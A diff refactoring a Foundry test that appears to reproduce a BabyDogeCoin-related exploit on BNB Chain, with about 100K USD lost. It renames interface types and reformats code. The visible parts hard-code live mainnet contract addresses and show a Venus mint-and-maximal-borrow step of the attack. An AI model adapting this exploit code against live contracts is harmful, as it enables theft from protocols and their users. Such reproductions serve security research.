@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~100K USD$
 // Attacker : https://bscscan.com/address/0xee6764ac7aa45ed52482e4320906fd75615ba1d1
@@ -54,12 +53,12 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IBabyDogeCoin BabyDogeCoin = IBabyDogeCoin(0xc748673057861a797275CD8A068AbB95A902e8de);
-    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
+    IUniswapV3Pair pool = IUniswapV3Pair(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
     ICErc20Delegate vUSDT = ICErc20Delegate(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
     ICErc20Delegate vBUSD = ICErc20Delegate(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
     crETH vBNB = crETH(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
-    Uni_Router_V2 BabyDogeRouter = Uni_Router_V2(0xC9a0F685F39d05D835c369036251ee3aEaaF3c47);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router BabyDogeRouter = IUniswapV2Router(0xC9a0F685F39d05D835c369036251ee3aEaaF3c47);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IFeeFreeRouter FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
     IUnitroller Unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
     ISimplePriceOracle VenusChainlinkOracle = ISimplePriceOracle(0xd8B6dA2bfEC71D684D3E2a2FC9492dDad5C3787F);
@@ -153,7 +152,7 @@ contract ContractTest is Test {
         vBUSD.mint(BUSD.balanceOf(address(this)));
         (, uint256 AccountLiquidity,) = Unitroller.getAccountLiquidity(address(this));
         uint256 UnderlyingPrice = VenusChainlinkOracle.getUnderlyingPrice(address(vBNB));
-        borrowAmount = (AccountLiquidity * 1e18 / UnderlyingPrice) * 9999 / 10_000;
+        borrowAmount = (((AccountLiquidity * 1e18) / UnderlyingPrice) * 9999) / 10_000;
         vBNB.borrow(borrowAmount);
     }
 
